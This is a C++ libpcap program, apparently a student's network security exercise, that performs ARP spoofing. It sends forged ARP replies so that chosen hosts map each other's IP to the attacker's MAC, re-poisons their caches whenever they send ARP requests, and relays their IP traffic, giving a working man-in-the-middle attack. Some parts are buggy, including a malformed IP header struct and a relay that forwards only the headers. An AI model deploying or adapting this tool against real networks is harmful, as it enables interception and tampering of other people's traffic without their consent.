#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <iostream>
#include <pcap.h>
#include <vector>
#include <map>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "main.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

struct IpHdr{
	uint8_t version;
	uint8_t typeofservice;
	uint16_t toal_len;
	uint8_t id;
	uint16_t frag_off;
	uint8_t livetime;
	uint8_t protocol;
	uint16_t checksum;
	Ip s_addr;
	Ip d_addr;
};

struct EthIpPacket final{
	EthHdr eth_;
	IpHdr ip_;
};
using namespace std;

void modify_packet(EthIpPacket* Ippacket, Mac target_MAC) {
    if (Ippacket->ip_.d_addr == Ip("192.168.10.2")) { // 특정 IP
        Ippacket->eth_.dmac_ = target_MAC; // 목표 MAC으로 변경
    }
}

char* get_my_MAC(const char* iface) {
    int fd;
    struct ifreq ifr;
    unsigned char *mac = NULL;
    memset(&ifr, 0, sizeof(ifr));
    fd = socket(AF_INET, SOCK_DGRAM, 0);
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name , iface , IFNAMSIZ-1);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &ifr)) {
        mac = (unsigned char *)ifr.ifr_hwaddr.sa_data;
	}
    close(fd);
	char* mac_p=(char*)malloc(18);
	snprintf(mac_p,18,"%02x:%02x:%02x:%02x:%02x:%02x",mac[0],mac[1],mac[2],mac[3],mac[4],mac[5]);
    return mac_p;
}
char* get_my_IP(const char *iface) {
    	int fd;
    	struct ifreq ifr;
    	static char ip[INET_ADDRSTRLEN];
    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0) {
        	perror("socket");
        	return NULL;
   	 }
   	 memset(&ifr, 0, sizeof(ifr));
   	 ifr.ifr_addr.sa_family = AF_INET;
   	 strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);
   	 if (ioctl(fd, SIOCGIFADDR, &ifr) == 0) {
       		 struct sockaddr_in *ipaddr = (struct sockaddr_in *)&ifr.ifr_addr;
       		 inet_ntop(AF_INET, &ipaddr->sin_addr, ip, sizeof(ip));
   	 } else {
        perror("ioctl");
        close(fd);
        return NULL;
    }
    close(fd);
    return ip;
 }


Mac get_others_MAC(pcap_t* handle,char* dev,Ip s_IP, Ip m_IP, Mac m_MAC){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("FF:FF:FF:FF:FF:FF");
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(m_IP);
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(s_IP);
	int res= pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "1pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		return Mac("00:00:00:00:00:00");
	}
	struct pcap_pkthdr* header;
	const u_char* pkt_data;
	while(1){
		res=pcap_next_ex(handle, &header, &pkt_data);
		if(res==0){
			continue;
		}
		struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
        struct ArpHdr* res_arp_packet=(struct ArpHdr*)(pkt_data+sizeof(EthHdr));

		if(res_eth_packet->type()==EthHdr::Arp&&res_arp_packet->op()==ArpHdr::Reply&&res_arp_packet->sip()==Ip(s_IP)){
			Mac sender_mac = Mac(res_eth_packet->smac_);
			const uint8_t* mac_addr=(const uint8_t*)sender_mac;
			return sender_mac;
		}	
	}
}

void send_arp(pcap_t* handle,char* dev, Mac s_MAC,Mac m_MAC,Ip s_IP, Ip t_IP){
	EthArpPacket packet;

	packet.eth_.dmac_ = s_MAC;
	packet.eth_.smac_ = m_MAC;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = m_MAC;
	packet.arp_.sip_ = htonl(t_IP);
	packet.arp_.tmac_ = s_MAC;
	packet.arp_.tip_ = htonl(s_IP);

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	return;
}

void relay(pcap_t* handle,struct pcap_pkthdr* header,const unsigned char* pkt_data,char* dev,char* errbuf, Mac t_MAC,Mac m_MAC,Mac s_MAC, Ip s_IP, Ip t_IP){
	struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
 	if(res_eth_packet->type()==EthHdr::Ip4){
		struct IpHdr* res_Ip_packet=(struct IpHdr*)(pkt_data+sizeof(EthHdr));
		EthIpPacket Ippacket;
		memcpy(&Ippacket.ip_,res_Ip_packet,sizeof(IpHdr));
		memcpy(&Ippacket.eth_,res_eth_packet,sizeof(EthHdr));
		Ippacket.eth_=*res_eth_packet;

		modify_packet(&Ippacket,t_MAC);

		if(ntohl(res_Ip_packet->d_addr)==Ip(t_IP)&&ntohl(res_Ip_packet->s_addr)==Ip(s_IP)){
			res_eth_packet->dmac_ = Mac(t_MAC);
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
			if (res != 0) {
				fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}
		else if(ntohl(res_Ip_packet->d_addr)==Ip(s_IP)&&ntohl(res_Ip_packet->s_addr)==Ip(t_IP)){
			res_eth_packet->dmac_=Mac(s_MAC);
			int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Ippacket), sizeof(EthIpPacket));
			if (res != 0) {
				fprintf(stderr, "3pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
			}
		}
	}
	return;
}

void reinfect(pcap_t* handle,struct pcap_pkthdr* header,const unsigned char* pkt_data,char* errbuf, char* dev, Mac s_MAC,Mac t_MAC, Mac m_MAC, Ip s_IP, Ip t_IP){
	struct EthHdr* res_eth_packet=(struct EthHdr*)pkt_data;
	if(res_eth_packet->type()==EthHdr::Arp){
		struct ArpHdr* res_arp_packet=(struct ArpHdr*)(pkt_data+sizeof(EthHdr));
		if(res_eth_packet->dmac()==Mac("ff:ff:ff:ff:ff:ff")&&res_arp_packet->op()==ArpHdr::Request&&res_arp_packet->sip()==Ip(t_IP)){
			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
		}
		else if(res_eth_packet->dmac()==Mac("ff:ff:ff:ff:ff:ff")&&res_arp_packet->op()==ArpHdr::Request&&res_arp_packet->sip()==Ip(s_IP)){
			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
		}
		else if(res_eth_packet->dmac()==Mac(m_MAC)&&res_arp_packet->sip()==Ip(s_IP)){
			send_arp(handle,dev,s_MAC,m_MAC,s_IP,t_IP);
		}
		else if(res_eth_packet->dmac()==Mac(m_MAC)&&res_arp_packet->sip()==Ip(t_IP)){
			send_arp(handle,dev,t_MAC,m_MAC,t_IP,s_IP);
		}
	}
	return;
	
}

void usage() {
	printf("syntax: send-arp-test <interface> <ip1> <1p2>\n");
	printf("sample: send-arp-test wlan0 192.168.10.1 192.168.10.3 \n");
}

int main(int argc, char* argv[]) {
	if (argc%2 != 0||argc==2) {
		usage();
		return -1;
	}
	char* dev = argv[1];
	map<Ip,Mac> ipmap=map<Ip,Mac>();
	char* mac=get_my_MAC(dev);
	Mac my_MAC=Mac(mac);
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev,BUFSIZ,1,1,errbuf);
	if(handle==nullptr){
		fprintf(stderr,"couldn't open device %s(%s)\n",dev,errbuf);
		return -1;
	}
	char* my_ip=get_my_IP(dev);
	Ip my_IP=Ip(my_ip);
	for(int i=1;i<argc/2;i++){
		Ip send_IP=Ip(argv[i*2]);
		Ip tar_IP=Ip(argv[i*2+1]);
		Mac send_MAC;
		Mac tar_MAC;
		if(ipmap.find(send_IP)!=ipmap.end()){
			send_MAC =ipmap[send_IP];
		}else{
			send_MAC=get_others_MAC(handle,dev,send_IP,my_IP,my_MAC);
			ipmap[send_IP]=send_MAC;
		}
		if(ipmap.find(tar_IP)!=ipmap.end()){
			tar_MAC=ipmap[tar_IP];
		}
		else{
			tar_MAC=get_others_MAC(handle,dev,tar_IP,my_IP,my_MAC);
			ipmap[tar_IP]=tar_MAC;
		}
		send_arp(handle,dev,send_MAC,my_MAC,send_IP,tar_IP);
		send_arp(handle,dev,tar_MAC,my_MAC,tar_IP,send_IP);
	}
		while(1){
			struct pcap_pkthdr* header;
			const u_char* pkt_data;
			int res=pcap_next_ex(handle, &header, &pkt_data);
			if(res==0){
				continue;
			}
			for(int i=1;i<argc/2;i++){
				Ip send_IP=Ip(argv[i*2]);
				Ip tar_IP=Ip(argv[i*2+1]);
				Mac send_MAC =ipmap[send_IP];
				Mac tar_MAC=ipmap[tar_IP];
				reinfect(handle,header,pkt_data,errbuf,dev,send_MAC,tar_MAC,my_MAC,send_IP,tar_IP);
				relay(handle,header,pkt_data,errbuf,dev,tar_MAC,my_MAC,send_MAC,send_IP, tar_IP);
			}
		}
	return 0;
}
